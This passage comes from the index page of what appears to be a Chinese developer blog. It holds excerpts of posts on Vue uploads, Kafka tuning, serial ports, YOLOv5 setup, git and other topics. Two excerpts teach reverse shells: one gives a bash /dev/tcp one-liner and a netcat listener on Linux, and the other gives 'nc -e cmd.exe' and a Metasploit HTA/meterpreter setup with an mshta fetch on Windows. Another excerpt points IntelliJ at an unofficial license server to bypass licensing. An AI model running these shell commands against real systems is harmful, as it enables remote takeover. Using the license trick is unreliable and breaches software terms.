我尝试了这种方式，发现后台无法正常的接受前端发过来的请求，发过来的请求都是只包含文件名，但是不包含文件内容。所以只能无奈放弃这种方案了。
1.2 我的方案：
我的方案是这样的，支持多文件上传，这样多文件，点击上传的时候会触发多次action请求。
在成功回调里面计数，如果成功的次数等于待上传的个数，那就是成功，否则是失败。
二：实现-VUE部分 首先是布局的部分，就是正常的使用el-upload上传。
&lt;template&gt; &lt;div class="login-view"&gt; &lt;div class="login-form"&gt; ...无用代码略过 &lt;el-form ref="form" label-position="left" :model="form" class="el-form"&gt; &lt;el-form-item label="上传文件:" prop="excelFile"&gt; &lt;el-upload class="el-upload" ref="upload" multiple :action="this.SERVE_URL + 'upload_img'" name="excelFile" drag :data="upData" :on-change="onUploadChange" :file-list="fileList" :on-error="uploadFalse" :on-success="uploadSuccess" :auto-upload="false" &gt; &lt;i class="el-icon-upload"&gt;&lt;/i&gt; &lt;div class="el-upload__text"&gt;将文件拖到此处，或&lt;em&gt;点击上传&lt;/em&gt;&lt;/div&gt; &lt;!-- &lt;el-button slot="trigger" size="small" &gt;选取文件&lt;/el-button&gt; --&gt; &lt;/el-upload&gt; &lt;/el-form-item&gt; &lt;/el-form&gt; &lt;div class="button-view"&gt; &lt;!-- &lt;p&gt;头像: &lt;input type="file" id="files" ref="refFile" multiple="multiple" v-on:change="fileLoad" /&gt;&lt;/p&gt; --&gt; &lt;button @click="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/275d38662c8de27d229828b02d18030b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4d9aafb42447c667cccfa9ca3018d4f/" rel="bookmark">
			el-cascader级联选择器那些事
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		el-cascader级联选择器那些事 1、获取选中的节点及其所有上级 vue3+element-plus+ts 1、获取选中的节点及其所有上级 使用cascader组件提供的getCheckedNodes()
&lt;el-cascader :options="options" :show-all-levels="false" @change="changeCascader" ref="cascader" /&gt; const cascader = ref(); const options = [ { value: 'fu1', label: '父1', type: '父type1', children: [ { value: 'zi1', label: '子1', type: '子type1', children: [ { value: 'sun1', label: '孙1', type: '孙type1', }, { value: 'sun2', label: '孙2', type: '孙type2', }, ], }, { value: 'zi2', label: '子2', type: '子type2', }, ], }, { value: 'fu2', label: '父2', type: '父type2', }, ]; const changeCascader = () =&gt; { let nodesInfo = cascader.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4d9aafb42447c667cccfa9ca3018d4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50115aa4138b0601086cbf1637ffbe4e/" rel="bookmark">
			“坏邻居”导致的kafka生产者TPS下降原因排查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景： 今天测试了两种不同的场景下kafka producer的tps性能数据，两种场景下都是使用3个线程，每个线程都是对应一个kafka producer，测试发送到kafka集群的消息的量，两个场景的区别是场景A只发送kafka消息，场景B是除了发送kafka消息之外，还使用logback记录日志(异步模式)，但是得到的发送到kafka集群的消息的量相差较大，大概20%，本文就记录下造成kafka消息发送的tps相差较大的原因
追查原因: 一.还原下测试场景 首先说明下场景A和场景B的压测环境，
服务器：两个场景都是使用12核12G的容器进行测试的
消息大小： 两个场景使用的消息大小都是1k，logback记录到日志中的文本大小也是1k
kafka producer 数量： 两者都是3个生产者，分别对应3个发送消息的线程
最终压测的结果：
场景A也就是只有发送消息到kafka的TPS为80000，而场景B也就是既发送消息到kafka，也是用logback日志落盘的场景TPS为58000，两者相差将近1/3的TPS，
二.分析场景 gc影响： 场景A和场景B压测过程中的gc次数都差不多，总的gc停顿时间都差不多，都没有明显的gc停顿
cpu：在整个压测的过程中场景A的CPU使用率是60%，也就是使用到了12核 * 0.6 = 7.2核，场景B的cpu使用率是100%，也就是使用到了12核 * 1.0 = 12核
分析整个过程中的cpu火焰图，发现场景A中发送kafka消息的Run方法占用的cpu为40%，而场景B中发送kafka消息的Run方法占用的cpu为17%，也就是说场景A中总共使用的cpu核心=7.2核 * 0.4=2.9核，而场景B中总共使用的cpu核心=12核 * 0.17=2.1核,
是不是大概看出了问题所在？
场景A中每个核心发送的kafka消息的TPS为：80000/2.9核心 = 26600，而场景B中每核心发送kafka消息的TPS为：58000/2.1核心 = 27600
这两个场景中归结到每个cpu核上的TPS几乎是差不多的，所以问题也就明显了，场景B中cpu资源不足，也就是logback等模块占用了不少的cpu的资源，导致消耗在发送kafka消息上的cpu资源少了
总结： 1.从这个问题的查找可以得出一个结论，当对两个场景进行压测时，最好不要让cpu跑满100%，因为这样会限制对应场景能获得的cpu的资源，压测的结果就明显受限于cpu。
2.当我们进行压测时，压测的场景要尽量符合真实的场景，因为真实场景下有很多“坏邻居”，比如这里的场景B的logback模块，他们有可能对要压测的指标有很负面的影响.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/570d0c3a9bdb193cb220e7347f01866d/" rel="bookmark">
			linux反弹shell方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux反弹shell方法 Linux文件描述符 文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件
文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容
在Linux系统中内核默认为每个进程创建三个标准的文件描述符：
0 （标准输入）
1 （标准输出）
2（标准错误）
通过查看 /proc/PID/fd 目录下的文件，就可以查看每个进程拥有的所有文件描述符
Linux标准文件描述符的操作 Linux系统将所有设备都当作文件来处理，而Linux用文件描述符来标识每个文 件对象。当Linux启动的时候会默认打开三个文件描述符。
文件描述符缩写描述默认设备0STDIN标准输入默认设备键盘1STDOUT标准输出默认设备显示器2STDERR标准错误输出默认设备显示器 Bash反弹Shell原理 什么是反弹shell 被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。
被控端
bash -i &gt;&amp; /dev/tcp/192.168.42.132/6666 0&gt;&amp;1 攻击端
nc –lvvp 6666 参数解释
bash -i ： 打开一个交互式的bash shell /dev/tcp/IP/PORT ： /dev/tcp/是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。 0&gt;&amp;1 : 将输入重定向到标准输出，为了确保命令执行后的输入被正确的传回攻击机 打开/dev/tcp/ip/port 这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。
通过 socket 连接通信 向 /dev/tcp/IP/PORT 写入内容 nc -lvvp 6666 echo hello &gt; /dev/tcp/192.168.42.132/6666 从 /dev/tcp/IP/PORT 读取内容，从攻击端监听输入的内容是什么 nc -lvvp 6666 cat &lt; /dev/tcp/192.168.42.132/6666 反弹shell方法 NC 这里nc监听到的会话没有终端的回显，可以通过python -c ‘import pty; pty.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/570d0c3a9bdb193cb220e7347f01866d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1217e7797b9d8a9f6b72b2e561915ec5/" rel="bookmark">
			在写SpringMVC项目时出现org.springframework.web.servlet.support等程序包不存在问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		其实很简单，主要是这个仓库配置的问题，我之前使用了上一个项目的仓库导致这个项目运行时找不到需要的包- -
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7be6d61b033cc1471a57ae75a7fec756/" rel="bookmark">
			Windows 反弹shell方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows 反弹shell方法 反弹Shell简介 正向shell ： 控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。
反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端 由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送 过来的数据包。
NC(少用) NC正向Shell 原理：被控端将cmd.exe重定向到本地的6666端口，攻击机主动连接被控端的6666端 口，即可获得shell
被控端：nc -lvvp 6666 -e cmd.exe 攻击端：nc 受害机器ip 6666 NC反向Shell 原理：被控端将cmd.exe重定向到攻击机的7777端口，攻击端只需要监听本地的7777 端口，即可获得shell。
攻击端：nc -lvvp 7777 被控端：nc -e cmd.exe 攻击机ip 7777 Mshta Mshta.exe 是用于负责解释运行 HTA ( HTML 应用程序)文件的 Windows OS 实 用程序。 可以运行 JavaScript 或 VBScript 的 HTML 文件。
Metasploit HTA WebServer 通过 Metasploit 的 HTA Web Server 模块发起 HTA 攻击
use exploit/windows/misc/hta_server set srvhost 192.168.81.154 set payload windows/x64/meterpreter/reverse_tcp set target 1 run -j //目标windowx上执行 mshta http://192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7be6d61b033cc1471a57ae75a7fec756/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/332da0c3b969ffb3a8be71e75617ddef/" rel="bookmark">
			linux串口操作命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.显示某个串口参数信息：stty -F /dev/ttyS7 -a 2.设置某个串口参数信息：stty -F /dev/ttyS7 speed 115200 cs7 -parenb -cstopb -echo（7位数据位，无校验，1位停止位，无回显） 3.设置串口参数：stty -F /dev/ttyS0 ispeed 115200 ospeed 115200 cs8； 4.串口发送数据：echo "abcdefg" &gt; /dev/ttyS7； 5.显示串口接收数据：cat /dev/ttyS7； 6.stty命令的几项主要选项功能为： 选项parenb使终端进行奇偶校验，-parenb则是禁止校验； 选项cs5、cs6、cs7和cs8分别将字符大小设为5、6、7和8比特； 选项300、600、1200、2400、4800、9600和19200设置波特率； cstopb和-cstopb分别设置两个或一个停止位； tabs使系统使用制表符而不是空格序列，因此减少了输出量，选项-tabs仅使用空格，当终端不能 正确处理制表符（tab）时应使用该项。 7.ospeed N speed 打印出终端的速度 csN 把字符长度设为N, N 为[5..8] [-]cstopb 对每字符使用两个停止位 (一个带有 `-') [-]parenb 在输出中产生奇偶校验位，并要求在输入中也有奇偶校验位（'_'表示无校验） [-]parodd 设置奇校验 (偶校验用 `-') 原文链接：https://blog.csdn.net/weixin_40467234/article/details/130091248 如下截图是本人操作的实例：
进行操作前，应先短接你所要测的串口的RX和TX,在PC上打开终端输入命令，然后在debug串口中可看到读写的显示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5f315411cc695b979ab7271eef9cf90/" rel="bookmark">
			手把手教你云相册项目简易开发 day2 Springboot&#43;SpringCloud&#43;Nacos&#43;Fegin&#43;SpringCloudGateway&#43;S3存储-minio/华为云OBS相关配置和简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		书接上回 首先我们先改一下上一次创建好的子项目里的application文件，其中分别改一下对应的application的名字，以便后面介绍SpringCloud的时候Nacos注册名字方便寻找到子项目，还需要修改端口，其中端口修改分别如下：
api：9009 users：9008 image：9007 gateway：88 audit：9001（gateway和audit后面会介绍到，可以先按照之前的先创建好）
测试接口 先介绍一下各个注解：
@Controller：返回给前端的内容是视图
@ResponseBody：将方法或者接口返回的数据渲染成JSON
@RestController：相当于@Controller+@ResponseBody，一般在类上注释了@RestController则就直接说明返回给前端的内容是JSON形式的，而如果只是单独需要某个方法返回JSON则可以接口注释@Controller而具体某个方法上注释@ResponseBody
@RequestParam：表示接受对应的请求里需要带有单个参数
@RequestBody：表示接受对应的请求里需要带有请求体
接下来在在cloud-photo-users项目里的UserController进行接口测试
1.先创建一个common包导入下面代码，作用是把返回的数据封装一下
BaseErrorInfo package com.cloud.photo.users.common; /** * 自定义描述错误接口 * @author linzsh */ public interface BaseErrorInfo { /** * 错误码 * @return 错误码 */ Integer getResultCode(); /** * 错误描述 * @return 错误描述 */ String getResultMsg(); } CommonEnum：封装常用的自定义错误枚举类 package com.cloud.photo.users.common; /** * 自定义错误枚举类 * @author linzsh */ public enum CommonEnum implements BaseErrorInfo { //success SUCCESS(200, "成功！"), //error INTERNAL_SERVER_ERROR(90500, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5f315411cc695b979ab7271eef9cf90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cca55e269d547b2d6e1176a080f53585/" rel="bookmark">
			基于Yolov5环境配置详解（真的很方便很简单）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
#前言
写在前面#很重要#
本文相应版本
一、查看CUDA
二、安装Anaconda
三、安装Pytorch环境
五、安装Pycharm
六、验证Pytorch
七、下载Yolov5-5.0源码和权重文件
八、安装Microsoft C++ 生成工具
九、测试Yolov5
#总结
#前言 本文主要讲解了如何配置Yolov5的运行环境
在竞赛期间接触了机器视觉，为了完成对各种垃圾的目标检测，我用了yolov5模型去实现。刚开始的配置环境的时候用了两周的时间，还会遇到各种报错；主要是版本问题，因为要对应Jeston nano的环境（也可能不需要对应）；如果只要给电脑配置环境就很简单了
如果在文章中有的地方说的不好或者说错了的地方，希望能私信我，我会进行修改，谢谢啦
写在前面#很重要# 最最最最重要的事情就是版本，不仅torch和torchvision要对应，跟Python的版本也要对应！下图是对照表，大家根据需求和对照表来选择版本
本文相应版本 Windows10
NVDIA GeForce 1650ti
Anaconda3
Python3.6.8
Pytorch1.8
Torchvision 0.9
一、查看CUDA 1、英伟达官方下载显卡驱动：英伟达官网https://www.nvidia.cn/Download/index.aspx?lang=cn
2、下载
3、下载完成并更新
4、在cmd中查看输入如下指令查看cuda的版本
nvidia-smi 注意这里的版本是最高版本，也可以安装低一点的版本
二、安装Anaconda 这是一个环境管理软件，用处是来建立一个虚拟环境，因为在软件开发中，会有需要很多不用的环境来适应不用的需求，你可以在这个虚拟环境里安装想要的各种包，不会受到大环境的限制，每个环境之间也是不会影响的
1、官网下载： Free Download | Anacondahttps://www.anaconda.com/download#Downloads
速度有点慢
2、运行安装包
3、下一步
4、 我同意
5、 这里选择Just Me就行，然后下一步
6、这里选择安装的地址，最好是D盘，然后下一步
7、这里的第二个选项将Anaconda3加入到环境变量要选上，这样就不用手动加了，然后下一步
8、安装完成
到此Anaconda3就安装完成了，但是在桌面上是不会显示图标的，在开始栏菜单里有，可以给它拉到桌面上
三、安装Pytorch环境 1、首先创建虚拟环境，打开cmd，进入base环境（下载Anaconda3自带的一个环境）
activate base 2、输入conda create -n 环境名字（英文） python=x.x（python版本），这些可以根据自己需求来改；例如我创建的是名字为yolov5，python为3.6.8的环境
conda create -n yolov5 python=3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cca55e269d547b2d6e1176a080f53585/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d49a0318e077651066e15a198ecc783/" rel="bookmark">
			2023年11月软考高级网络规划设计师报名时间-报名入口-报名流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软考高级网络规划设计师报名时间： 广东2023下半年软考高级网络规划设计师报名时间：8月16日9:00-8月24日17:00
江西2023下半年软考高级网络规划设计师报名时间：8月15日9点-9月8日17点
安徽2023下半年软考高级网络规划设计师报名时间：8月15日9:00至8月21日16:00
甘肃2023下半年软考高级网络规划设计师报名时间：8月28日9:00－9月6日18:00
海南2023下半年软考高级网络规划设计师报名时间：8月14日至8月21日
四川2023下半年软考高级网络规划设计师报名时间：8月14日至8月30日
广西2023下半年软考高级网络规划设计师报名时间：8月15日8:00至8月24日17:00
内蒙古2023下半年软考高级网络规划设计师报名时间：8月17日-8月28日24:00
黑龙江2023下半年软考高级网络规划设计师报名时间：8月16日-8月22日
软考高级网络规划设计师报名入口： 全国计算机技术与软件专业技术资格（水平）考试
​软考高级网络规划设计师报名流程（仅供参考）： 1.注册
首次登录报名系统的报考人员须按要求填写个人信息进行注册。
2.实名认证
首次登录报名系统的报考人员须进行实名认证，实名认证通过后方可进行报名操作。
3.上传电子照片、填报及提交信息
为防范人员跨地市流动带来的疫情防控风险，报考人员须选择考试时工作或居住所在地市进行报名。
4.缴费
缴费成功即完成报名，逾期不缴费，视为放弃报名。
5.准考证打印
网上缴费成功的考生在规定时间内( 10月31日9 : 00- 11月4日17 : 00)打印准考证。
报名照片要求：
1.上传照片必须为考生本人近期正面免冠彩色证件照，务必保证照片清晰，可辨认，其他如生活照、视频捕捉、摄像头所摄等照片-律不予审核;
2.照片格式为jpg ，分辨率295*413 ，尺对为2.5cm*3.5cm ，大小约为10KB ;
3.头部占照片尺寸2/3，晚背景;
4.面部正面头发不得过眉，露双耳，长戴眼镜的考生应佩戴眼镜。
注:报考人员应使用报名系统中提供的照片处理工具对照片进行处理后上传。
报名信息怎么填 报名需要填写的信息分为7个部分，分别是:报名城市、基本信息、报考信息、在职情况、工作情况、教育情况、联系方式。下面来具体讲一下每 个部分如何填写。
一、报名城市(考试考区)
报名城市就是你选择参加考试的城市和区域，建议选择自己离现居地离得近的考区，可以节省考试时通勤的时间，避免迟到等意外情况发生。如是异地考生报名软考考试，需注意看报考考区是否允许异地考生参加考试。考区选择并不是考点，考点是当地软考办根据各考区报考情况进行分配的，具体考点以准考证上的考试地点为准。
二、基本信息
1.姓名:填写真实姓名。
2.证件类型:建议选择身份证，填写后其他信息会自动填充，不用再次填写。
3.证件号码
4.性别
5.出生日期
6.年龄
三、报考信息
1.报考级别:即你所报考软考专业的所属级别，如系统集成项目管理工程师属中级。
2.报考资格:即你所报考的专业名称，如系统集成项目管理工程师。
3.报考科目:选择专业名称后自动填充，如选择系统集成项目管理工程师，自动显示基础知识，应用技术。
4.现有职称:有职称的考生填写职称名称，没有职称的考生填写"无”。
5.取得职称时间:有职称的考生填写取得职称时间，没有职称的考生空置不填。
四、在职情况
有在职、在校、其他三个选项，按个人实际情况填写。选择在校将不用填写五、工作情况的内容。
五、工作情况
1.工作单位:填写目前工作单位名称。如四、在职情况选择的是其他，目前是无业或自由职业，工作单位填写“无”即可。
2.参加工作时间:填写参加当前工作时间。如四、在职情况选择的是其他，可填写参加第一份工作时间或直接填写毕业时间。
3.本专业工作时间:指毕业后做与报考专业相关工作的时间，由于软考报名没有工作年限限制，填写的跟参加工作时间一样即可。
六、教育情况
1.毕业学校:根据个人情况按最高学历填写即可。
2.所学专业:如没有专业填写“无”即可。
3.毕业时间
4.专业名称:如没有专业填写"无" 即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d49a0318e077651066e15a198ecc783/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfff3d6c504ed5e2c5f265e651c9dd14/" rel="bookmark">
			FPGA PLL锁相环控制LED闪烁程序设计与仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开发软件：Quartus 13.0 开发组件：Cyclone IV EP4CE10F17C8 仿真：Modelsim 10.1d
文章目录 PLL锁相环一、程序设计二、仿真测试问题总结 PLL锁相环 PLL：Phase Locked Loop（锁相环）是一种反馈控制电路，其特点是利用外部输入的参考信号控制环路内部震荡信号的频率和相位。它可以将FPGA的系统时钟转化所需的倍频及相位时钟，是IC开发中很重要的一个部分。PLL的工作原理图如下图所示：
​
锁相环通常由鉴相器（FPD，Frequency Phase Detector）、滤波器（LF，Loop Filter）和压控振荡器（VCO，Voltage Controlled Oscillator）3部分组成前向通路，由VCO分频器组成频率相位的反馈通路。PLL的组成结构如下图所示：
​
摘自：https://blog.csdn.net/weixin_48956120/article/details/130695162
一、程序设计 任务：利用FPGA的PLL IP核实现LED闪烁控制。
思路：通过FPGA的4个I/O口连接4个LED，设定这些I/O为输出模式。内部计数器完成计数后改变该各I/O口的电平状态，实现LED灯的闪烁效果。
步骤：建立工程、新建顶层文件、调用PLL IP核、编写Testbench仿真文件、仿真。
代码如下：
My_PLL.v （例化PLL IP核的顶层文件） `timescale 1ps/1ps module My_PLL ( input wire clk, // inclk0.clk input wire rst, // arest.rst output wire outclk_0, // outclk0.clk output wire outclk_1, // outclk1.clk output wire outclk_2, // outclk2.clk output wire outclk_3, // outclk3.clk output wire outclk_4, // outclk4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bfff3d6c504ed5e2c5f265e651c9dd14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c15cd4b7c6fdc2ed6dd87959c35c9d3b/" rel="bookmark">
			微信小程序canvas生成图片并保存本地
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 createImage: function(){ let imageWidth = this.data.imageWidth, imageHeight = this.data.imageHeight; wx.canvasToTempFilePath({ //将canvas生成图片 canvasId: 'gameCanvas', x: 0, y: 0, width: imageWidth, height: imageHeight, destWidth: imageWidth, //截取canvas的宽度 destHeight: imageHeight, //截取canvas的高度 success: function (res) { wx.saveImageToPhotosAlbum({ //保存图片到相册 filePath: res.tempFilePath, success: function () { wx.showToast({ title: "生成图片成功！", duration: 2000 }) } }) } }) } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a812af1f18ee84e28d23dcb0ff412af/" rel="bookmark">
			uniapp 打包安卓apk (原生App)云打包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniapp 打包安卓apk (原生App)云打包 hbuilder中操作
项目的一些配置appid
DCloud appid 用途/作用/使用说明： https://ask.dcloud.net.cn/article/35907
右键我们项目目录-》发行-》原生APP-云打包
说明： 1. 打包安卓，只选择安卓打包项；
2. android包名默认是配置里填充的appid;
3. 证书选择一般是自有证书和公共测试证书，如果是测试版本可以选择公共测试证书，如果上正式环境，是要申请自有证书的，Android平台签名证书(.keystore)生成指南，
申请证书要安装配置JRE环境，这个环境一般后端电脑上都有，根据文档生成一下，生成后是 XXX.keystore
点击打包 时间可能稍微长点，打包成功后有成功提示，然后找到对应的apk文件,如下图：
数据线连接后，就可以安装到自己的安卓机上看看自己写的bugl啦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/356c567e2bd0cf4d5e693a346c958577/" rel="bookmark">
			Web直播之RTMP协议：vue-video-player &#43; videojs-flash
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		视频直播服务目前支持3种直播协议：RTMP、HLS、HTTP-FLV。
本文主要讲解在 Vue 项目中如何使用 vue-video-player 播放器播放 rtmp 流。
1.准备工作 cnpm install --save vue-video-player cnpm install --save videojs-flash cnpm install --save videojs-swf 2.代码实战 &lt;template&gt; &lt;div&gt; &lt;video-player :options="playerOptions"&gt;&lt;/video-player&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import { videoPlayer } from 'vue-video-player' import 'video.js/dist/video-js.css' import 'videojs-flash' import SWF_URL from 'videojs-swf/dist/video-js.swf' export default { components: { videoPlayer }, data () { return { playerOptions: { autoplay: true, sources: [{ type: 'rtmp/mp4', src: 'rtmp://58.200.131.2:1935/livetv/hunantv' // 亲测可用 }], techOrder: ['html5', 'flash'], flash: { swf: SWF_URL } } } } } &lt;/script&gt; 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/356c567e2bd0cf4d5e693a346c958577/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9571852165a3144a549bf90c7295814/" rel="bookmark">
			Vscode中Git常用操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、初始化绑定远程仓库 git config --global user.name "你的用户名" git config --global user.email "你的邮箱" 如果需要关联gitee/github仓库，先创建ssh秘钥然后在个人设置-ssh公钥中进行绑定
ssh-keygen -t rsa -C "your_email@example.com" 在要建立的目录下初始化，远程绑定仓库（远程仓库无内容的情况）
git status #查看当前本地git状态 git init #创建仓库，即创建 .git 文件，之后才能在该文件夹下使用 git 命令进行操作 git remote add origin &lt;url&gt; #添加远程仓库(配置 remote origin) git remote set-url origin &lt;remote-url&gt;#修改绑定的远程仓库 二、常用提交 1、先创建gitignore 文件取消.vscode等不需要上传的文件/文件夹
.vscode # 表示不追踪当前路径下的.vscode文件夹 *.txt #表示不追踪当前文件夹下所有以 .txt 结尾的文件 build/** #表示不追踪当前文件夹下的 build 文件夹内的所有文件 **/build/** #表示不追踪所有的 build 文件夹内所有的文件 2、然后add commit push 三件套， 如果想要添加个别文件就类似 git add test.c ，
master可以改成想绑定的分支名，一般先pull再push ，不行可以git push -f 强推
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9571852165a3144a549bf90c7295814/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8789f67fbe091dcf2b5520c276897c0/" rel="bookmark">
			Error running xxx Command line is too long. Shorten the command line via JARmanifest or via...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		启动报错 Error running xxx Command line is too long. Shorten the command line via JAR manifest or via a classpath file and rerun. 解决方法 把需要测试或启动的application都进行如上操作即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a76c4a79878e53a66b6e554003928a4/" rel="bookmark">
			Your idea evaluation has expired. Your session will be limited to 30 minutes. For information on how
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决：Your idea evaluation has expired. Your session will be limited to 30 minutes. For information on how to upgrade your evaluation software please go to https://www.jetbrains.com/idea/buy/?fromIDE 1、把提示框的x点掉，会自动打开idea。
2、工具栏选择—“Help” -&gt; “Register”，弹窗选择License server方式，地址填入：http://fls.jetbrains-agent.com。
3、点击 Activate 和 Test Connection ，出现提示 “Connection successful”，说明成功了。
4、关掉idea，重新打开即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9615ad4d83abdd1095c8bb20a2b3ec18/" rel="bookmark">
			UE4 制作导出Content目录下某个文件夹内所有模型的六视图并将模型资源文件复制到指定文件夹的插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、新建空白插件 在Bulid.cs内加入两个模块，"EditorSubsystem","UnrealEd",
PublicDependencyModuleNames.AddRange( new string[] { "Core", "EditorSubsystem", "UnrealEd", // ... add other public dependencies that you statically link with here ... } ); 创建继承于EditorSubsystenm的子类
点创建后会报错，没关系回C++重新编译一下就好
二、C++代码 ExportSixViewsSub.h // Fill out your copyright notice in the Description page of Project Settings. #pragma once #include "CoreMinimal.h" #include "EditorSubsystem.h" #include "ExportSixViewsSub.generated.h" class USpringArmComponent; /** * */ UCLASS() class EXPORTSIXVIEWS_API UExportSixViewsSub : public UEditorSubsystem { GENERATED_BODY() public: //获取World UFUNCTION(BlueprintPure, Category = "FunTool") UWorld* GetContextWorld(); //遍历指定路径下所有的StaticMesh UFUNCTION(BlueprintCallable, Category = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9615ad4d83abdd1095c8bb20a2b3ec18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/073df61a41404a9f65bab7999a3fef78/" rel="bookmark">
			Linux快速搭建tensorflow-gpu 1.15.0环境&amp;Keras（包括30系显卡）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.创建虚拟环境：tmp_python conda create -n tf python=3.6 温馨提醒：python3.8暂不支持tensorflow-gpu 1.15版本，请使用python3.6版本
2.显示自己创建的虚拟环境 conda env list 3.进入创建虚拟环境 source activate tf 4.安装指定 版本的TensorFlow ps:若为tensorflow1.x版本则执行：
pip3 install tensorflow-gpu==1.15.0 -i https://pypi.tuna.tsinghua.edu.cn/simple ps:若为tensorflow2.x版本则执行：
pip3 install tensorflow-gpu==2.1.0 -i https://pypi.tuna.tsinghua.edu.cn/simple 5.安装的包(务必执行) ps:若为tensorflow1.x版本则执行：
conda install cudatoolkit=10.0 -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/linux-64/ conda install cudnn=7.6.5 -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/linux-64/ ps:若为tensorflow2.x版本则执行：
conda install cudatoolkit=10.1 -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/linux-64/ conda install cudnn=7.6.5 -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/linux-64/ 小技巧：若安装其他版本，先查看Tensorflow-gpu对应支持的cuda版本（官网），然后进入清华镜像网站，搜索cudnn，然后找到对应的cuda版本
6.验证是否安装成功 先输入python进入交互式界面，然后用如下命令验证是否gpu版本启用
import tensorflow as tf tf.test.is_gpu_available() 若最后显示True，则恭喜你，安装成功！
7.安装Keras（可选） Keras需要在TensorFlow之上才能运行，所以要先安装Tensorflow；安装完Tensorflow后，输入以下命令安装Keras：
pip install keras==2.3.1 -i https://pypi.tuna.tsinghua.edu.cn/simple ps:附上keras与tensorflow对应版本的链接：https://master–floydhub-docs.
	</div>
	<div class="list__footer clearfix">
